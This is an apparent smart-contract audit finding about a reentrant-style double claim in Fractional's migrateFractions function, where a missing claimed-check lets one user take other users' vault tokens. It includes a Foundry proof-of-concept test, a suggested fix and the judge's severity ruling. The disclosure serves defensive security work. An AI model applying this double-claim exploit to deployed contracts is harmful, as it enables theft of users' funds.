[H-16]migrateFractionsmay be called more than once by the same user which may lead to loss of tokens for other users
Submitted by dipp, also found by 0x52, ak1, auditor0517, hansfriese, jonatascm, kenzo, Lambda, panprog, PwnedNoMore, Ruhum, smiling_heretic, Treasure-Seeker, and xiaoming90
ThemigrateFractionsfunction in theMigration.solcontract is used to send new vault tokens to the user calculated based on the amount of ETH and fractions the user contributed to the migration proposal. After it is called once the user should have all the new vault tokens owed to them.
Since the function does not check if the user had already called it, a user may call it more than once, allowing them to gain more new vault tokens than they are owed. If a user repeatedly uses this function to gain new tokens then other users may not be able to get their new tokens.
Proof of Concept
Test code added toMigrations.t.sol:
The test code below shows the first user (Alice) migrating their tokens to the new vault twice before the second user (Bob) callsmigrateFractionswhich then fails.
functiontestMigrateFractionsAgain()public{// SetuptestSettle();(, , , ,addressnewVault, , , , ) =migrationModule.migrationInfo(vault,1);(addressnewToken,uint256id) =registry.vaultToToken(newVault);// First user migrates fractions twiceassertEq(IERC1155(newToken).balanceOf(address(migrationModule),id),TOTAL_SUPPLY*2);// Confirm Migration has all new tokensassertEq(getFractionBalance(alice.addr),4000);// Alice joined with 1 ether and 1000 fractionsalice.migrationModule.migrateFractions(vault,1);assertEq(IERC1155(newToken).balanceOf(alice.addr,id),6000);// Alice's shares == 6000assertEq(IERC1155(newToken).balanceOf(address(migrationModule),id),TOTAL_SUPPLY*2-6000);// Confirm Migration loses new tokensalice.migrationModule.migrateFractions(vault,1);assertEq(IERC1155(newToken).balanceOf(alice.addr,id),12000);// Confirm Alice gains 6000 new tokens againassertEq(IERC1155(newToken).balanceOf(address(migrationModule),id),8000);// Confirm Migration loses new tokens// Second user attempts to migrate fractionsassertEq(getFractionBalance(bob.addr),0);// Bob joined with 1 ether and 5000 fractions (all of his fractions)vm.expectRevert(stdError.arithmeticError);bob.migrationModule.migrateFractions(vault,1);// Bob is unable to call migrateFractions and gain new tokens because the migration module does not contain enough tokensassertEq(IERC1155(newToken).balanceOf(bob.addr,id),0);// Confirm Bob does not gain any new tokens (supposed to gain 14,000 tokens)}
Recommended Mitigation Steps
A possible fix might be to set theuserProposalEthanduserProposalFractionsto 0 after the userâ€™s tokens have been migrated.
mehtaculous (Fractional) confirmed
HardlyDifficult (judge) increased severity to High and commented:
migrateFractionscan be called multiple times, stealing funds from other users. This is a High risk issue.Selecting this submission as the primary for including a clear POC.